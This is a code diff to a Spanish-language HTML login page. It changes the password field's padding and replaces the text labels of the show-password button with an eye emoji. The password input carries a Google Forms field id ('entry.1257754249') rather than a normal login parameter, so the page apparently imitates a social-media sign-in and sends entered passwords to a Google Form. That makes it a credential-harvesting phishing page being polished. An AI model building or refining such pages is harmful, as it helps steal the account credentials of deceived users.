@@ -40,7 +40,7 @@
 
         .password-container input {
             width: 100%;
-            padding-right: 50px;
+            padding-right: 40px;
         }
 
         .toggle-password {
@@ -51,9 +51,9 @@
             background: none;
             border: none;
             color: #0095f6;
-            font-weight: bold;
-            font-size: 14px;
+            font-size: 12px;
             cursor: pointer;
+            padding: 2px 5px;
         }
 
         button {
@@ -80,7 +80,7 @@
         
         <div class="password-container">
             <input type="password" id="password" name="entry.1257754249" placeholder="Contraseña" required>
-            <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar</button>
+            <button type="button" class="toggle-password" onclick="togglePassword()">👁</button>
         </div>
 
         <button type="submit">Iniciar sesión</button>
@@ -94,10 +94,10 @@
         
         if (passwordInput.type === "password") {
             passwordInput.type = "text";
-            toggleButton.textContent = "Ocultar";
+            toggleButton.textContent = "👁";
         } else {
             passwordInput.type = "password";
-            toggleButton.textContent = "Mostrar";
+            toggleButton.textContent = "👁";
         }
     }
 
